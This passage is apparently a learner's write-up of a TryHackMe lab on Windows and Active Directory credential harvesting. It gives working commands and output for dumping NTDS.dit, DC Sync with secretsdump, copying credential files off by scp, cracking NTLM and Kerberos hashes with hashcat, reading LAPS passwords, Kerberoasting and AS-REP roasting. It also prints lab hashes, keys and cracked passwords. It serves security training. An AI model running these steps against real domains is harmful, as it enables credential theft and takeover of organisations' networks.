- C:\Windows\NTDS\ntds.dit
- C:\Windows\System32\config\SYSTEM
- C:\Windows\System32\config\SECURITY

The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory.

```shell-session
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.

```shell-session
python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

## Remote Dumping (With Credentials)

In the previous section, we discussed how to get hashes from memory with no credentials in hand. In this task, we will be showing how to dump a system and domain controller hashes remotely, which requires credentials, such as passwords or NTLM hashes. We also need credentials for users with administrative access to a domain controller or special permissions as discussed in the DC Sync section.

## DC Sync

The DC Sync is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set 

An adversary takes advantage of these configurations to perform domain replication, commonly referred to as "DC Sync", or Domain Controller Sync. For more information about the DC Sync attack, you can visit the THM [Persisting AD](https://tryhackme.com/room/persistingad) room (Task 2).

The Persisting AD room uses the Mimikatz tool to perform the DC Synchronisation attack. Let's demonstrate the attack using a different tool, such as the Impacket SecretsDump script.

```shell-session
python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.156.128 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
```

Let's explain the command a bit more.

- the `-just-dc` argument is for extracting the NTDS data.
- the `thm.red/AD_Admin_User` is the authenticated domain user in the form of (domain/user).

Note if we are interested to dump only the NTLM hashes, then we can use the `-just-dc-ntlm` argument as follows,

```shell-session
python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.156.128
```

Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such `hashcat`. We can use the hashcat`-m 1000` mode to crack the Windows NTLM hashes as follows:

```shell-session
hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
```


## Practical

---

We need to answer:

![Pasted image 20250528130901.png](../../../IMAGES/Pasted%20image%2020250528130901.png)

We can begin by doing:

```powershell
powershell â€œntdsutil.exe â€˜ac i ntdsâ€™ â€˜ifmâ€™ â€˜create full c:\tempâ€™ q qâ€
```

![Pasted image 20250528131014.png](../../../IMAGES/Pasted%20image%2020250528131014.png)

We will get this output, we can see both directories on `c:\temp`:

![Pasted image 20250528131121.png](../../../IMAGES/Pasted%20image%2020250528131121.png)

We can use scp again to transfer them:

```
scp "C:\temp\Active Directory\ntds.dit" "C:\temp\Active Directory\ntds.jfm" USER@IP:/home/USER
scp "C:\temp\registry\SYSTEM" "C:\temp\registry\SECURITY" USER@IP:/home/USER
```

Once we got all files, we need to do:

```python
python3 secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:d115642944a273e47e1df9056b2f676994d96a1cea4a0c03ae15d71424af4878c9bae4d3132010c2c7dc3795bc166ab3ce825bda177ecb3e2d03d09b582b459af4da5798785c0228ea3a75943d25eba7b4f2be84cccce470a6a2edbe1d1d40265cdcf7ca32ecad18362cb5bab7c0c1074cf74289fb6098e95b8f108f399072bd0b3b34d3e5878a9930bb11ece47d567192a017bd7332cfd801a9b515ddeebd1bd64a04d95775d8790753f90fc859006f9483ddb9c6c346dac898e3aac3ef12d3aadf7f71e3e657517e51ae0e5376632d585c1fd322c0d1fcd51b5b5bf574a55c6db06fb269d31f548a985c093c6bb8e6
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:ecb310874fabc79ee06f696c8e19ce58
[*] DPAPI_SYSTEM
dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be
dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32
[*] NL$KM
 0000 8D D2 8E 67 54 58 89 B1 C9 53 B9 5B 46 A2 B3 66 ...gTX...S.[F..f
 0010 D4 3B 95 80 92 7D 67 78 B7 1D F9 2D A5 55 B7 A3 .;...}gx...-.U..
 0020 61 AA 4D 86 95 85 43 86 E3 12 9E C4 91 CF 9A 5B a.M...C........[
 0030 D8 BB 0D AE FA D3 41 E0 D8 66 3D 19 75 A2 D1 B2 ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:ecb310874fabc79ee06f696c8e19ce58:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
thm.red\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207:::
thm.red\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:::
thm.red\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30
Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0
Administrator:des-cbc-md5:6d34e608f8574632
CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:393e3a3ea59b2de093b8103d6f9c227422d32d25d9c03b83cc07beb76025b044
CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:c66902311da90e975f548101d710578e
CREDS-HARVESTIN$:des-cbc-md5:37e3974904b6dc89
krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3
krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c
krbtgt:des-cbc-md5:d92ffd4abf02b049
thm.red\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca
thm.red\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c
thm.red\thm:des-cbc-md5:794f3889e646e383
thm.red\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac
thm.red\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529
thm.red\victim:des-cbc-md5:457cdc673d3b0d85
thm.red\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26
thm.red\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf
thm.red\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4
thm.red\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f
thm.red\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6
thm.red\admin:des-cbc-md5:32a8a201d3080b2f
thm.red\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d
thm.red\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d
thm.red\svc-thm:des-cbc-md5:f8e57c49f7dc671c
thm.red\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e
thm.red\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546
thm.red\bk-admin:des-cbc-md5:108cc2b0d3100767
thm.red\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660
thm.red\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64
thm.red\test-user:des-cbc-md5:aec8e3325b85316b
sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242
sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f
sshd:des-cbc-md5:b58f850b4c082cc7
```

We got the target system bootkey:

```
0x36c8d26ec0df8b23ce63bcefa6e2d821
```

Now, we need the clear-text password for `bk-admin`, let's save the hash in a file and use hashcat:

```
echo '077cccc23f8ab7031726a3b70c694a49' > hash.txt
```

Now we can simply use hashcat:

```
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

We get:

```
077cccc23f8ab7031726a3b70c694a49:Passw0rd123
```

Got our password:

```
Passw0rd123
```


# Local Administrator Password Solution (LAPS)

---

This task discusses how to enumerate and obtain a local administrator password within the Active Directory environment if a LAPS feature is configured and enabled.

## Group Policy Preferences (GPP)

A Windows OS has a built-in Administrator account which can be accessed using a password. Changing passwords in a large Windows environment with many computers is challenging. Therefore, Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP).

GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission.

The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on [MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN). Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).

## Local Administrator Password Solution (LAPS)

In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.

The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator, while the `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password. LAPS uses `admpwd.dll` to change the local administrator password and update the value of `ms-mcs-AdmPwd`.

![mblgsrj0.png](../../../IMAGES/mblgsrj0.png)



## Enumerate for LAPS

The provided VM has the LAPS enabled, so let's start enumerating it. First, we check if LAPS is installed in the target machine, which can be done by checking the `admpwd.dll` path.

```shell-session
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022 01:01 PM .
06/06/2022 01:01 PM ..
05/05/2021 07:04 AM 184,232 AdmPwd.dll
 1 File(s) 184,232 bytes
 2 Dir(s) 10,306,015,232 bytes free
```


The output confirms that we have LAPS on the machine. Let's check the available commands to use for `AdmPwd` cmdlets as follows,

```shell-session
PS C:\Users\thm> Get-Command *AdmPwd*

CommandType Name Version Source
----------- ---- ------- ------
Cmdlet Find-AdmPwdExtendedRights 5.0.0.0 AdmPwd.PS
Cmdlet Get-AdmPwdPassword 5.0.0.0 AdmPwd.PS
Cmdlet Reset-AdmPwdPassword 5.0.0.0 AdmPwd.PS
Cmdlet Set-AdmPwdAuditing 5.0.0.0 AdmPwd.PS
Cmdlet Set-AdmPwdComputerSelfPermission 5.0.0.0 AdmPwd.PS
Cmdlet Set-AdmPwdReadPasswordPermission 5.0.0.0 AdmPwd.PS
Cmdlet Set-AdmPwdResetPasswordPermission 5.0.0.0 AdmPwd.PS
Cmdlet Update-AdmPwdADSchema 5.0.0.0 AdmPwd.PS
```

Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is `THMorg`. You can use the`-Identity *` argument to list all available OUs.

```shell-session
PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN ExtendedRightHolders
-------- --------------------
OU=THMorg,DC=thm,DC=red {THM\THMGroupReader}
```

The output shows that the `THMGroupReader` group in `THMorg` has the right access to LAPS. Let's check the group and its members.

```shell-session
PS C:\Users\thm> net groups "THMGroupReader"
Group name THMGroupReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.

PS C:\Users\victim> net user test-admin
User name test-admin
Full Name THM Admin Test Comment
User's comment
Country/region code 000 (System Default)
Account active Yes
Account expires Never

[** Removed **]
Logon hours allowed All

Local Group Memberships
Global Group memberships *Domain Users *Domain Admins
 *THMGroupReader *Enterprise Admins
The command completed successfully.
```

## Getting the Password

We found that the `bk-admin` user is a member of `THMGroupReader`, so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. After compromising the right user, we can get the LAPS password using `Get-AdmPwdPassword` cmdlet by providing the target machine with LAPS enabled.

```shell-session
PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName DistinguishedName Password ExpirationTimestamp
------------ ----------------- -------- -------------------
CREDS-HARVESTIN CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red FakePassword 2/11/2338 11:05:2...
```


## Practical

---

![Pasted image 20250528132953.png](../../../IMAGES/Pasted%20image%2020250528132953.png)

First answer is:

```
LAPsReader
```

We can use this to answer the second question:

```powershell
Get-ADGroupMember -Identity "LAPsReader"
Get-AdmPwdPassword CREDS-HARVESTIN
```



![Pasted image 20250528133309.png](../../../IMAGES/Pasted%20image%2020250528133309.png)

We got:

```
THMLAPSPassw0rd 
```

For the last question:

```powershell
Get-ADGroupMember -Identity â€œLAPsReaderâ€
```

![Pasted image 20250528133345.png](../../../IMAGES/Pasted%20image%2020250528133345.png)

Answer is:

```
bk-admin
```


# Other Attacks

---

In the previous tasks, the assumption is that we already had initial access to a system and were trying to obtain credentials from memory or various files within the Windows operating system. In other scenarios, it is possible to perform attacks in a victim network to obtain credentials.

This task will briefly introduce some of the Windows and AD attacks that can be used to obtain the hashes. Before diving into more AD attack details, we suggest being familiar with [Kerberos protocol](https://en.wikipedia.org/wiki/Kerberos_\(protocol\)) and New Technology LAN Manager (NTLM), a suite of security protocols used to authenticate users.

## Kerberoasting

Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack's end goal is to enable privilege escalation and lateral network movement. For more details about the attack, you can visit the THM [Persisting AD](https://tryhackme.com/room/persistingad) room (Task 3).

Let's do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the Kerberoasting attack from the AttackBox using the GetUserSPNs.py python script. Remember to use the THM.red/thm account with Passw0rd! as a password.

```shell-session
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.156.128 THM.red/thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation
---------------------------- ------- -------- -------------------------- --------- ----------
http/creds-harvestin.thm.red svc-user 2022-06-04 00:15:18.413578 
```

The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user's password to retrieve the required information.

The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.

```shell-session
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.156.128 THM.red/thm -request-user svc-user 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation
---------------------------- ------- -------- -------------------------- --------- ----------
http/creds-harvestin.thm.red svc-user 2022-06-04 00:15:18.413578 

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5
```

Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using `-m 13100` mode as follows,

```shell-session
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

Try replicating the steps against the attached VM by finding the SPN user and then performing the Kerberoasting attack. Once you have obtained the ticket, crack it and answer the question below.

## AS-REP Roasting

AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!

![njk1dpjr.png](../../../IMAGES/njk1dpjr.png)

The attached VM has one of the AD users configured with the "Do not require Kerberos preauthentication" setting. Before performing the AS-REP Roasting, we need a list of domain accounts that should be gathered from the enumeration step. In our case, we created a `users.lst` list in the tmp directory. The following is the content of our list, which should be gathered during the enumeration process.

```markup
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
```

We will be using the Impacket Get-NPUsers script this time as follows,

```shell-session
python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.156.128 thm.red/ -usersfile /tmp/users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We specified the IP address of the domain controller with the`-dc-ip` argument and provided a list of domain users to check against. Once the tool finds the right user with no preauthentication configuration, it will generate the ticket.

Various cybersecurity and hacking tools also allow cracking the TGTs harvested from Active Directory, including Rubeus and Hashcat. Impacket GetNPUsers has the option to export tickets as John or hashcat format using the`-format` argument.

## SMB Relay Attack

The SMB Relay attack abuses the NTLM authentication mechanism (NTLM challenge-response protocol). The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes. For this attack to work, the SMB signing must be disabled. SMB signing is a security check for integrity and ensures the communication is between trusted sources. We suggest checking the THM [Exploiting AD](https://tryhackme.com/room/exploitingad) room for more information about the SMB relay attack.

## LLMNR/NBNS Poisoning

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails. For example, suppose a machine within the network tries to communicate with no existing DNS record (DNS fails to resolve). In that case, the machine sends multicast messages to all network machines asking for the correct address via LLMNR or NBT-NS.

The NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic to the requested host with host identification service. If you want to learn more about the attack, we suggest checking THM [Breaching AD](https://tryhackme.com/room/breachingad) room.

The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authentication NTLM hashes for a victim, which helps obtain access to the victim's account or machine.


## Practical

---

![Pasted image 20250528133708.png](../../../IMAGES/Pasted%20image%2020250528133708.png)

Let's first enumerate for SPN users, we need to do:

```
python3 GetUserSPNs.py -request thm.red/thm -dc-ip MACHINE_IP
```

We will be prompted with a password, password is:

```
Passw0rd!
```

Then, we get this:

```python
python3 /home/samsepiol/pythonScripts/myenv/bin/GetUserSPNs.py -request thm.red/thm -dc-ip 10.10.156.128
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation
---------------------------- ------- -------- -------------------------- --------- ----------
http/creds-harvestin.thm.red svc-thm 2022-06-10 09:47:33.796826 <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-thm$THM.RED$thm.red/svc-thm*$361ad99fc603553f3fbb9b6202dd2177$bc771fe61ea42ea6034947e30e5b9e8e3a741b0a44b8dc1e2006fd2f7a1fc8e59fdd4a83637475cb31b18352f51314ddfaa9ebc94ed3406ae87c84d715159165588eee89c097451c3248d28798a6b302f65226940713ff124717c21ff6d58c586258eab008517a380832d7ec3168786edf7933498fd13ff04280a4a630bcdb5b43e6f8b6731acc87ece62f3ebe26f93b1f67eab7eaf7b4244bd82c10d984929f8e79145df794abf32231d842b7bbf13b29ba33de930dcb4d7efe0603566be734a1ed9d97a3f8d286eb655052128d9d61b907fe69cafa34e196d260ca0f7b6d1157c4df7cceb23d11d1f0a83d0cca5950e93826d5bf0be493a66e90a49f71488f856f18550050af0803269a575c16f51d642d908af9c379ce244fa4947019c6eecaee9b5027aa5541917c3c720defc41b5d78f0abdc552b4f0d3b989223f52a998b87e4b25bd80a9e7051fa0bbe35f0fc12796a8a0339ed6f2315f46e71b7afbe25632feb2820eec439952f62e68cd999c01a5cc90824367a82c26d0c8b822957dc1d5dc07238ce44e3c5a21cdb3a93b9878fb8c7cca640b025fc1a0b4bcde2e9011f6893313e2260209137397c4535d9a3b3416030efac8d11d9c2ecf2e8a2a4c2eeca4cc029fb5d3684de818d80d10d5c707a7c107838e3473f4366c7bbff0e537e9f69371e1217d7acee720b8203a4c339f09d7806f783b1dcb30759c0347d03087e19241e02d91c855e081bf7b9aa974800eeca1d50d9b135cb70c44b038db7618a789600b0c79ba6ff507cdd56e7db4f3eeb589e687b15c3df275e7805a92343f49a3b156ce11846a904b8389ee654aea8ca2f22e9db08337fec1861bd5195f9f5d6db2b7f085343427dddadd292ed603cd35bdc80dfd30b1363158b6d29e2efbd2093d4e3e57b1bb074a72828bddd31df502ecbafb38823b82625f2d7cdcbeb7cedcbb96ab4184e7a47b67cc269bd67d56e04638203ede4a5a468efc2cff6c6e9bda621a70ed925620be3fb2746a71beb2d1683969a058cd9c99396cc0cd9f1a23814c6efb3023c0c827664c65013b708219c059073f9e73b1a061c5327d19ccade15d8eac1002bbab94afcaa472a9019cd4e665a472cd1817384d37d77a37e9344a9eb96b012de573f0a861c33d905e33c7d1c18a348e2f3a80a9df2a061b45e78337c664835f021f1e78008f5d18b1fe66f94ad243cafd06f3ace714fc5e04309efb70c223080dcc97fa6c7c4e42b869ecab36f22
```

As seen, we got the service principal name:

```
svc-thm
```

Now, we need to grab the `TGS` and crack it:

```
echo '$krb5tgs$23$*svc-thm$THM.RED$thm.red/svc-thm*$361ad99fc603553f3fbb9b6202dd2177$bc771fe61ea42ea6034947e30e5b9e8e3a741b0a44b8dc1e2006fd2f7a1fc8e59fdd4a83637475cb31b18352f51314ddfaa9ebc94ed3406ae87c84d715159165588eee89c097451c3248d28798a6b302f65226940713ff124717c21ff6d58c586258eab008517a380832d7ec3168786edf7933498fd13ff04280a4a630bcdb5b43e6f8b6731acc87ece62f3ebe26f93b1f67eab7eaf7b4244bd82c10d984929f8e79145df794abf32231d842b7bbf13b29ba33de930dcb4d7efe0603566be734a1ed9d97a3f8d286eb655052128d9d61b907fe69cafa34e196d260ca0f7b6d1157c4df7cceb23d11d1f0a83d0cca5950e93826d5bf0be493a66e90a49f71488f856f18550050af0803269a575c16f51d642d908af9c379ce244fa4947019c6eecaee9b5027aa5541917c3c720defc41b5d78f0abdc552b4f0d3b989223f52a998b87e4b25bd80a9e7051fa0bbe35f0fc12796a8a0339ed6f2315f46e71b7afbe25632feb2820eec439952f62e68cd999c01a5cc90824367a82c26d0c8b822957dc1d5dc07238ce44e3c5a21cdb3a93b9878fb8c7cca640b025fc1a0b4bcde2e9011f6893313e2260209137397c4535d9a3b3416030efac8d11d9c2ecf2e8a2a4c2eeca4cc029fb5d3684de818d80d10d5c707a7c107838e3473f4366c7bbff0e537e9f69371e1217d7acee720b8203a4c339f09d7806f783b1dcb30759c0347d03087e19241e02d91c855e081bf7b9aa974800eeca1d50d9b135cb70c44b038db7618a789600b0c79ba6ff507cdd56e7db4f3eeb589e687b15c3df275e7805a92343f49a3b156ce11846a904b8389ee654aea8ca2f22e9db08337fec1861bd5195f9f5d6db2b7f085343427dddadd292ed603cd35bdc80dfd30b1363158b6d29e2efbd2093d4e3e57b1bb074a72828bddd31df502ecbafb38823b82625f2d7cdcbeb7cedcbb96ab4184e7a47b67cc269bd67d56e04638203ede4a5a468efc2cff6c6e9bda621a70ed925620be3fb2746a71beb2d1683969a058cd9c99396cc0cd9f1a23814c6efb3023c0c827664c65013b708219c059073f9e73b1a061c5327d19ccade15d8eac1002bbab94afcaa472a9019cd4e665a472cd1817384d37d77a37e9344a9eb96b012de573f0a861c33d905e33c7d1c18a348e2f3a80a9df2a061b45e78337c664835f021f1e78008f5d18b1fe66f94ad243cafd06f3ace714fc5e04309efb70c223080dcc97fa6c7c4e42b869ecab36f22' > svc-thm.hash
```

We can now do:

```
hashcat -m 13100 svc-thm.hash /usr/share/wordlists/rockyou.txt --force
```

We get this output:

```
$krb5tgs$23$*svc-thm$THM.RED$thm.red/svc-thm*$361ad99fc603553f3fbb9b6202dd2177$bc771fe61ea42ea6034947e30e5b9e8e3a741b0a44b8dc1e2006fd2f7a1fc8e59fdd4a83637475cb31b18352f51314ddfaa9ebc94ed3406ae87c84d715159165588eee89c097451c3248d28798a6b302f65226940713ff124717c21ff6d58c586258eab008517a380832d7ec3168786edf7933498fd13ff04280a4a630bcdb5b43e6f8b6731acc87ece62f3ebe26f93b1f67eab7eaf7b4244bd82c10d984929f8e79145df794abf32231d842b7bbf13b29ba33de930dcb4d7efe0603566be734a1ed9d97a3f8d286eb655052128d9d61b907fe69cafa34e196d260ca0f7b6d1157c4df7cceb23d11d1f0a83d0cca5950e93826d5bf0be493a66e90a49f71488f856f18550050af0803269a575c16f51d642d908af9c379ce244fa4947019c6eecaee9b5027aa5541917c3c720defc41b5d78f0abdc552b4f0d3b989223f52a998b87e4b25bd80a9e7051fa0bbe35f0fc12796a8a0339ed6f2315f46e71b7afbe25632feb2820eec439952f62e68cd999c01a5cc90824367a82c26d0c8b822957dc1d5dc07238ce44e3c5a21cdb3a93b9878fb8c7cca640b025fc1a0b4bcde2e9011f6893313e2260209137397c4535d9a3b3416030efac8d11d9c2ecf2e8a2a4c2eeca4cc029fb5d3684de818d80d10d5c707a7c107838e3473f4366c7bbff0e537e9f69371e1217d7acee720b8203a4c339f09d7806f783b1dcb30759c0347d03087e19241e02d91c855e081bf7b9aa974800eeca1d50d9b135cb70c44b038db7618a789600b0c79ba6ff507cdd56e7db4f3eeb589e687b15c3df275e7805a92343f49a3b156ce11846a904b8389ee654aea8ca2f22e9db08337fec1861bd5195f9f5d6db2b7f085343427dddadd292ed603cd35bdc80dfd30b1363158b6d29e2efbd2093d4e3e57b1bb074a72828bddd31df502ecbafb38823b82625f2d7cdcbeb7cedcbb96ab4184e7a47b67cc269bd67d56e04638203ede4a5a468efc2cff6c6e9bda621a70ed925620be3fb2746a71beb2d1683969a058cd9c99396cc0cd9f1a23814c6efb3023c0c827664c65013b708219c059073f9e73b1a061c5327d19ccade15d8eac1002bbab94afcaa472a9019cd4e665a472cd1817384d37d77a37e9344a9eb96b012de573f0a861c33d905e33c7d1c18a348e2f3a80a9df2a061b45e78337c664835f021f1e78008f5d18b1fe66f94ad243cafd06f3ace714fc5e04309efb70c223080dcc97fa6c7c4e42b869ecab36f22:Passw0rd1
```

Got our password:

```
Passw0rd1
```

![Pasted image 20250528134354.png](../../../IMAGES/Pasted%20image%2020250528134354.png)


# Conclusion

---

## Recap

In this room, we discussed the various approaches to obtaining users' credentials, including the local computer and Domain Controller, which conclude the following:

- We discussed accessing Windows memory, dumping an LSASS process, and extracting authentication hashes.
- We discussed Windows Credentials Manager and methods to extract passwords. - We introduced the Windows LAPS feature and enumerated it to find the correct user and target to extract passwords.
- We introduced AD attacks which led to dumping and extracting users' credentials.

